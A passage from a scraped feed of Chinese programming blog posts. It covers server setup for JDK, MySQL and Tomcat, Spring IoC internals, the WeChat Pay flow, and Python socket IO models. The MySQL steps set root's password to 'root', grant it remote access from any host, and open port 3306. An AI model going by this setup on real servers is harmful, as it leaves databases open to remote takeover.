&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
set password = password('root');
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;11）&lt;span&gt;开启&lt;/span&gt;mysql的远程登录&lt;/p&gt;
&lt;p&gt;&lt;span&gt;默认情况下&lt;/span&gt;mysql为安全起见，不支持远程登录mysql，所以需要设置开启 &lt;span&gt;远程登录&lt;/span&gt;mysql的权限&lt;/p&gt;
&lt;p&gt;&lt;span&gt;登录&lt;/span&gt;mysql后输入如下命令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
grant all privileges on *.* to 'root' @'%' identified by 'root'&lt;span&gt;;

flush privileges;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;12）&lt;span&gt;开放&lt;/span&gt;Linux的&lt;span&gt;对外访问的端口&lt;/span&gt;3306&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
/sbin/iptables -I INPUT -p tcp --dport 3306 -&lt;span&gt;j ACCEPT

&lt;/span&gt;/etc/rc.d/init.d/iptables save ---将修改永久保存到防火墙中 
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;概述&quot;&gt;4. Linux下tomcat的安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;安装步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;上传&lt;/span&gt;Tomcat到linux上&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;解压&lt;/span&gt;Tomcat安装包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
tar -zxvf apache-tomcat-7.0.52.tar.gz
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3）&lt;span&gt;开放&lt;/span&gt;Linux的对外访问的端口8080&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
/sbin/iptables -I INPUT -p tcp --dport 8080 -&lt;span&gt;j ACCEPT

&lt;/span&gt;/etc/rc.d/init.d/iptables save             --将配置保存到防火墙中
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4）&lt;span&gt;启动关闭&lt;/span&gt;Tomcat&lt;/p&gt;
&lt;p&gt;&lt;span&gt;进入&lt;/span&gt;tomcat的bin下启动：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
./startup.sh
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;进入&lt;/span&gt;tomcat的bin下关闭：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
./shutdown.sh 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;作者： &lt;a href=&quot;https://www.cnblogs.com/jichi/&quot;&gt;经典鸡翅&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 13:49:00 +0000</pubDate>
<dc:creator>经典鸡翅</dc:creator>
<og:description>1. 概述 今天教大家在linux下安装jdk，mysql以及tomcat。在javaweb开发中，最后完成的项目代码，一般都是布在linux服务器下的。因为linux服务器可以说是安全性稳定性都比w</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jichi/p/9985988.html</dc:identifier>
</item>
<item>
<title>带着萌新看springboot源码8（spring ioc源码上） - java小新人</title>
<link>http://www.cnblogs.com/wyq1995/p/9985598.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wyq1995/p/9985598.html</guid>
<description>&lt;p&gt;　　emmm.....这次先不说springboot原理，先好好回顾一下以前的注解版spring原理，先把spring原理了解清晰了，再看springboot原理更容易。&lt;/p&gt;
&lt;p&gt;　　要说起spring，最重要的就是创建ioc容器的全过程，也可以叫做生命周期。&lt;/p&gt;
&lt;p&gt;　　所谓的ioc容器就是实现类；我们常看到的，有一个最顶层的BeanFactory接口，还有一个子接口ApplicationContext，其实现类都可说是ioc容器（称呼很笼统），只是ApplicationContext功能更强大，而且可以通过配置文件来实现功能，所以我们用这个接口的实现类（比如我们测试时候ApplicationContext ctx = &lt;span class=&quot;hljs-keyword&quot;&gt;new ClassPathXmlApplicationContext(&lt;span class=&quot;hljs-string&quot;&gt;&quot;com/yf/context/beans.xml&quot;);&lt;/span&gt;&lt;/span&gt;）比较多；&lt;/p&gt;
&lt;p&gt;　　其实，就我感觉，ioc容器的生命周期有一条主线：ioc容器创建（其实就是类实例化，但是还没有属性赋值等操作）--------&amp;gt;加载所有bean的定义信息--------&amp;gt;创建bean的实例---------&amp;gt;属性赋值（调用bean的setxxx方法）----------&amp;gt;假如bean实现了xxxAware接口，就执行setXXX方法----------&amp;gt;执行初始化方法（相当于xml&amp;lt;bean init-method=&quot;初始化方法&quot;&amp;gt;）-----------&amp;gt;ioc容器创建完成，执行一些逻辑代码-------------&amp;gt;Web应用关闭，ioc容器销毁。&lt;/p&gt;
&lt;p&gt;　　跟着这条主线，然后再执行很多的后置处理器（xxxPostProcessor）的方法（大多是xxxBeforexxx，xxxAfterxxx方法），换句话来说，只要我们搞清楚了这些后置处理器什么时候添加到容器内？什么时候执行？有什么效果？那么ioc容器的原理就差不多一目了然了。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;提前准备（依赖，随便一个类，配置类，测试方法）：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119161810674-2077494094.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119162458217-2131207534.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119162526520-1369999478.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119162815862-609704.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　点开这个类AnnotationConfigApplicationContext，加载新建ioc容器，加载配置文件读取信息知道就可以了，来看看refresh方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119163644587-968713816.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119172026784-588081859.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　最好可以自己亲自调试一步一步的看过程，我这里只会大概说一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119164753293-1892531760.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119164858995-2027891709.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119165017848-639702218.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　下面就来简要说说这12个流程&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;1.刷新前的准备工作（prepareRefresh）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119170842367-1188470755.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119170258112-1005525970.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;strong&gt;&lt;span&gt;2.获取容器（&lt;/span&gt;&lt;span&gt;obtainFreshBeanFactory()&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119192205975-1505821642.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119192443157-122557598.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　点开this.beanFactory就到了如下这个类&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119192644801-565389253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119192739857-1044539538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　然后就是将这个新创建的容器返回，并打印日志到控制台就ok了，没啥好说的&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;3.对BeanFactory进行预准备工作（prepareBeanFactory）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119193937636-1044712306.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119194426742-1047016804.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119194852473-1716490154.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;4.对BeanFactory准备完成后做一些进一步处理的工作&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　点开这个方法，你会发现这是一个空方法，留给你自己实现的。你可以继承本类或者子类，然后在容器创建完成并且准备工作做完之后，把BeanFactory返回给你，看你还需不需要再自定义一些其他的什么鬼。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119195247202-577560113.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;5.执行BeanFactory的后置处理器（invokeBeanFactoryPostProcessors(beanFactory)   ）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119201729587-286778234.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119202055634-381394522.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　下面注意后置处理器的两个接口：BeanFactoryPostProcessor接口和它的子接口BeanDefinitionRegistryPostProcessor，先执行实现了后面的这个接口的所有后置处理器，在执行所有实现了前面的这个接口的后置处理器。&lt;/p&gt;
&lt;p&gt;　　后面就是拿到容器BeanFactory里面的所有BeanDefinitionRegistryPostProcessor，按照这三种：实现PriorityOrdered接口，实现Ordered接口，没实现这两个接口；分别进行分类，添加到中间容器（currentRegistryProcessors），然后分别排序，添加到registryProcessors的容器里面（这三种后置处理器最终都是放到这里），分别遍历中间容器，执行。（由于过程重复，就以实现PriorityOrdered接口的为例）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119203443607-840022426.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　现在再执行所有实现了BeanFactoryPostProcessor这个接口的后置处理器（里面肯定是遍历，然后分别执行）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119211248488-2122428806.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　假如BeanFactory不是BeanDefinitionRegistry接口的实现类，不用什么排序啊什么的，就直接执行所有的后置处理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201811/1368608-20181119211734474-1178311146.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　然后，后面的代码和这上面差不多，也是拿到所有的BeanFactory的后置处理器，然后各种分类，但是我还是想不通不是应该都执行完了所有的BeanFactory的后置处理器了吗？emmmmm,.....水平有限，网上找了找，还真的找到了。&lt;/p&gt;
&lt;p&gt;　　原话是：”以上逻辑执行了所有参数传入的和以bean定义方式存在的BeanDefinitionRegistryPostProcessor,也执行了所有参数传入的BeanFactoryPostProcessor, 但是尚未处理所有以bean定义方式存在的&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;BeanFactoryPostProcessor, 下面的逻辑处理这部分 BeanFactoryPostProcessor.“&lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;　　&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;看来是上面这种处理还有些遗漏了BeanFactory后置处理器，后面再补充一下。对此我只想说，我勒个去，太特么严谨了。。。。小的服了@_@!&lt;/p&gt;
&lt;p&gt;　　 然后继续运行就到第六步了，第六步下一节再一起看。&lt;/p&gt;

&lt;p&gt;前面这五步也是粗略的看了看源码，有个印象，很多的细节我都略过去了（偷个懒），不然，还能再写很多。。。。。&lt;/p&gt;

&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt; &lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 13:45:00 +0000</pubDate>
<dc:creator>java小新人</dc:creator>
<og:description>emmm.....这次先不说springboot原理，先好好回顾一下以前的注解版spring原理，先把spring原理了解清晰了，再看springboot原理更容易。 要说起spring，最重要的就是</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wyq1995/p/9985598.html</dc:identifier>
</item>
<item>
<title>微信支付 - 超超不会飞</title>
<link>http://www.cnblogs.com/chaohangz/p/9985936.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chaohangz/p/9985936.html</guid>
<description>&lt;p&gt;微信支付分为JSAPI支付，扫码支付，APP支付，小程序支付等不同的支付方式。但大体的支付过程是一致的，本文以JSAPI支付，也就是微信内的H5支付为例，描述一下支付的整个开发流程。&lt;/p&gt;
&lt;h2 id=&quot;配置&quot;&gt;配置&lt;/h2&gt;
&lt;p&gt;商户需要提前开通商户平台，并去公众平台或开放平台提交微信支付申请，获得商户号和秘钥。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=3_1&quot;&gt;详细文档可以看这里&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;支付流程&quot;&gt;支付流程&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/661386-e5e5bf339f87a617.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;微信内网页支付时序图&quot;/&gt;&lt;/p&gt;
&lt;p&gt;微信支付的流程图画的很完整，开发前要把整个流程研究清楚。&lt;/p&gt;
&lt;p&gt;整个流程，服务端需要做的有三件事。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;前端支付按钮被触发后，服务端要去调用 &lt;a href=&quot;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=9_1&quot;&gt;统一下单&lt;/a&gt; 接口，把预付单信息、支付参数和参数签名返回给前端。前端根据这些参数唤起支付。&lt;/li&gt;
&lt;li&gt;当用户支付成功后，微信会给我们一个回调通知，告知我们支付结果。这一步要实现“完成订单”操作，标记用户已经成功支付，进入“发货”流程。&lt;/li&gt;
&lt;li&gt;提供一个查询接口，让前端再次确认是否支付成功。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;统一下单&quot;&gt;统一下单&lt;/h2&gt;
&lt;p&gt;在支付前，商户系统先调用该接口在微信支付后台生成预支付交易单，同样的，商户系统也需要在自己的表里记录一笔“未完成订单”。生成之后返回正确的预付单信息、支付参数和参数签名返回给前端。前端根据这些参数唤起支付。&lt;/p&gt;
&lt;p&gt;接口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://api.mch.weixin.qq.com/pay/unifiedorder&lt;/code&gt;&lt;br/&gt;&lt;a href=&quot;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=9_1&quot;&gt;参数巨多，具体还是看文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里需要说明的一点是，我们在调用这个接口时，需要签一次名用来给微信做校验，微信也返回了一个新的签名用来给我们做校验，然后我们还要返回给前端一个签名，用来唤起支付。这三个签名都不是同一个。&lt;/p&gt;
&lt;p&gt;我们不能直接把调用统一下单接口返回的签名返回给前端，而是&lt;strong&gt;根据前端唤起支付的参数去重新签名&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;注意，是&lt;strong&gt;根据前端唤起支付的参数去重新签名&lt;/strong&gt;，因为前端的参数名和后端的参数名会略微有差别，这里需要小心。&lt;/p&gt;
&lt;p&gt;说明：签名的意图是用来校验身份，当前端把这些参数传给微信，微信会把调用参数除去签名后重新签名，用来校验签名的正确性，所以用来签名的参数名要和前端参数一致。&lt;/p&gt;
&lt;h2 id=&quot;支付结果通知&quot;&gt;支付结果通知&lt;/h2&gt;
&lt;p&gt;在统一下单时我们填了一个参数叫 &lt;code&gt;notify_url&lt;/code&gt;，这是一个服务端的接口地址，微信在用户支付成功后，会回调这个地址，告知我们支付结果。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=9_7&amp;amp;index=8&quot;&gt;详情看文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在这一步还是需要做多点校验的，免得被人有机可乘。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;校验支付是否成功，不成功直接返回&quot;FAIL&quot;&lt;/li&gt;
&lt;li&gt;校验签名和appid&lt;/li&gt;
&lt;li&gt;校验订单是否完成(幂等校验，防止微信多次回调导致多次订单写入)&lt;/li&gt;
&lt;li&gt;订单金额校验&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;一通校验完事之后就可以做业务相关的事了。记得所有操作结束后返回&quot;SUCCESS&quot;，不然微信会不断发起回调。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;流程图描述的很清楚，要仔细阅读流程图。&lt;/li&gt;
&lt;li&gt;调用完下单接口后要进行二次签名，签名的参数要看前端验签用哪些参数，即使是同一个参数，字段名也会跟第一次加签不一样。&lt;/li&gt;
&lt;li&gt;前端支付完成之后微信会有一个回调，我们需要做以下几点校验：
&lt;ol&gt;&lt;li&gt;做幂等处理（因为同样的通知微信可能发送多次）。&lt;/li&gt;
&lt;li&gt;校验签名，校验APPID。&lt;/li&gt;
&lt;li&gt;校验订单金额。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;订单状态分为 0-未支付 1-支付完成 2-支付失败：
&lt;ol&gt;&lt;li&gt;用户触发支付组件然后关闭或者杀掉进程微信不会给到后台任何回复，始终处于 0-未支付，所以这个状态也是一个支付失败状态。&lt;/li&gt;
&lt;li&gt;支付失败比较少见（到现在没有遇到过），比如签名错误（发生在调试阶段）。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;微信回执表尽量详细的记录微信传回的所有必有参数，以备出问题时排查。&lt;/li&gt;
&lt;li&gt;至今还没有找到微信本地调试的方法。&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Mon, 19 Nov 2018 13:40:00 +0000</pubDate>
<dc:creator>超超不会飞</dc:creator>
<og:description>微信支付分为JSAPI支付，扫码支付，APP支付，小程序支付等不同的支付方式。但大体的支付过程是一致的，本文以JSAPI支付，也就是微信内的H5支付为例，描述一下支付的整个开发流程。 配置 商户需要提</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chaohangz/p/9985936.html</dc:identifier>
</item>
<item>
<title>并发编程之IO模型 - 伍萬磊</title>
<link>http://www.cnblogs.com/wanlei/p/9965416.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wanlei/p/9965416.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1442172/201811/1442172-20181116205652263-259297533.png&quot; alt=&quot;&quot;/&gt; &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_07b7241b-6980-4624-8357-cb1dd764d1cc&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_07b7241b-6980-4624-8357-cb1dd764d1cc&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_07b7241b-6980-4624-8357-cb1dd764d1cc&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; concurrent.futures &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket

server &lt;/span&gt;=&lt;span&gt; socket.socket()
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 重用端口&lt;/span&gt;
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1&lt;span&gt;)

server.bind((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

server.listen(&lt;/span&gt;5&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 线程池&lt;/span&gt;
pool = ThreadPoolExecutor(3&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; data_handler(conn):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;一个新连接..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        data &lt;/span&gt;= conn.recv(1024&lt;span&gt;)
        conn.send(data.upper())

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
    conn,addr &lt;/span&gt;=&lt;span&gt; server.accept()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 切到处理数据的任务去执行&lt;/span&gt;
    pool.submit(data_handler,conn)
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;线程池阻塞IO服务端&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_f0c75b59-50e9-4040-9695-f15d8ab04f3b&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_f0c75b59-50e9-4040-9695-f15d8ab04f3b&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_f0c75b59-50e9-4040-9695-f15d8ab04f3b&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket

c &lt;/span&gt;=&lt;span&gt; socket.socket()

c.connect((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
    msg &lt;/span&gt;= input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; msg:&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;
    c.send(msg.encode(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
    data &lt;/span&gt;= c.recv(1024&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(data.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;线程池阻塞IO客服端&lt;/span&gt; &lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1442172/201811/1442172-20181116205811193-219955124.png&quot; alt=&quot;&quot;/&gt; &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_42f18ade-0a05-490f-bd58-8be8ae32fe39&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_42f18ade-0a05-490f-bd58-8be8ae32fe39&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_42f18ade-0a05-490f-bd58-8be8ae32fe39&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; concurrent.futures &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket

server &lt;/span&gt;=&lt;span&gt; socket.socket()
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 重用端口&lt;/span&gt;
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1&lt;span&gt;)

server.bind((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.11.210&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,9999&lt;span&gt;))

server.listen(&lt;/span&gt;5&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 设置是否为阻塞 默认阻塞&lt;/span&gt;
&lt;span&gt;server.setblocking(False)

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; data_handler(conn):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;一个新连接..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        data &lt;/span&gt;= conn.recv(1024&lt;span&gt;)
        conn.send(data.upper())
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 已连接的客户端&lt;/span&gt;
clients =&lt;span&gt; []
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 需要发送的数据&lt;/span&gt;
send_datas =&lt;span&gt; []
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 已经发送完的 需要删除的数据&lt;/span&gt;
del_datas =&lt;span&gt; []
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 待关闭的客户端&lt;/span&gt;
closed_cs =&lt;span&gt; []
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        conn,addr &lt;/span&gt;=&lt;span&gt; server.accept()
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 切到处理数据的任务去执行&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 代码走到这里才算是连接成功&lt;/span&gt;
